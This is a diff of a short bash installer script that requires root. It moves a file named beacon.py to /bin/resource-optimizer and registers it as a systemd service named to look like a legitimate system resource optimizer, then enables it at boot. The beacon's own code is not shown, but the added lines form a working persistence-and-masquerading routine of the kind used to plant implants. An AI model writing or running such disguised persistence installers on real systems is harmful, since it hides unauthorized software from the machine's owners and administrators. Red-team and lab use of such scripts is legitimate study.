@@ -1,9 +1,15 @@
 #!/bin/bash
 
-mkdir -p /media/music/metallica
-mkdir /media/movies
-mkdir /media/tv
-cd /media/movies/metallica
+if [[ $EUID -ne 0 ]]; then
+    echo "Run this script as root"
+    exit 1
+fi
 
-chmod 711 beacon.py
-./beacon.py
+mv ./beacon.py /bin/resource-optimizer
+mv ./systemd-resourceoptimization.service /etc/systemd/system/systemd-resourceoptimization.service
+
+chmod 711 /bin/resource-optimizer
+
+systemctl daemon-reload
+systemctl start systemd-resourceoptimization
+systemctl enable systemd-resourceoptimization
